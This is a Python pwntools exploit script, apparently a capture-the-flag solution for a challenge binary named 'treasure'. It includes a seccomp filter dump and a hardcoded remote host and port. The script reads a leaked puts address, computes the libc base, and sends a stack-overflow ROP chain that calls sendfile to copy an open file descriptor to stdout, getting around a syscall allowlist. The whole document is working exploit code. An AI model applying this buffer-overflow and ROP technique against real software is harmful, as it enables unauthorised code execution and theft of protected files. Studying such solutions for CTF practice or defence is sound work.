#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './treasure'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '143.198.215.203', 20037

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# breakrva 0x136d
breakrva 0x1810

c
'''.format(**locals())

def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(d1, d2=0):
  io.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return io.recvuntil(d2,drop=True)

# =========================================================
#                         EXPLOITS
# =========================================================
# $ seccomp-tools dump ./treasure 
# leaked: 0x710764487be0
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x1d 0xc000003e  if (A != ARCH_X86_64) goto 0031
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x1a 0xffffffff  if (A != 0xffffffff) goto 0031
#  0005: 0x15 0x18 0x00 0x00000003  if (A == close) goto 0030
#  0006: 0x15 0x17 0x00 0x0000000f  if (A == rt_sigreturn) goto 0030
#  0007: 0x15 0x16 0x00 0x00000023  if (A == nanosleep) goto 0030
#  0008: 0x15 0x15 0x00 0x0000003c  if (A == exit) goto 0030
#  0009: 0x15 0x14 0x00 0x000000e7  if (A == exit_group) goto 0030
#  0010: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0015
#  0011: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
#  0012: 0x15 0x00 0x12 0x00000000  if (A != 0x0) goto 0031
#  0013: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
#  0014: 0x15 0x0f 0x10 0x00000000  if (A == 0x0) goto 0030 else goto 0031
#  0015: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0021
#  0016: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # write(fd, buf, count)
#  0017: 0x15 0x00 0x0d 0x00000000  if (A != 0x0) goto 0031
#  0018: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
#  0019: 0x15 0x0a 0x00 0x00000002  if (A == 0x2) goto 0030
#  0020: 0x15 0x09 0x0a 0x00000001  if (A == 0x1) goto 0030 else goto 0031
#  0021: 0x15 0x00 0x09 0x00000028  if (A != sendfile) goto 0031
#  0022: 0x20 0x00 0x00 0x00000014  A = out_fd >> 32 # sendfile(out_fd, in_fd, offset, count)
#  0023: 0x15 0x00 0x07 0x00000000  if (A != 0x0) goto 0031
#  0024: 0x20 0x00 0x00 0x00000010  A = out_fd # sendfile(out_fd, in_fd, offset, count)
#  0025: 0x15 0x00 0x05 0x00000001  if (A != 0x1) goto 0031
#  0026: 0x20 0x00 0x00 0x0000001c  A = in_fd >> 32 # sendfile(out_fd, in_fd, offset, count)
#  0027: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0031
#  0028: 0x20 0x00 0x00 0x00000018  A = in_fd # sendfile(out_fd, in_fd, offset, count)
#  0029: 0x15 0x00 0x01 0x00000003  if (A != 0x3) goto 0031
#  0030: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0031: 0x06 0x00 0x00 0x00000000  return KILL

def exploit():
    global io
    io = initialize()

    rcu(b': ')
    puts = int(io.recvline().strip(), 16)
    libc.address = puts - libc.sym['puts']

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx_rbx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
    
    payload = flat({
        64+8: [
            pop_rdi, 0x1,
            pop_rsi, 0x3,
            pop_rdx_rbx, 0x0, 0x0,
            libc.sym['sendfile']
        ]
    })
    sl(payload)

    log.info("libc base: %#x", libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
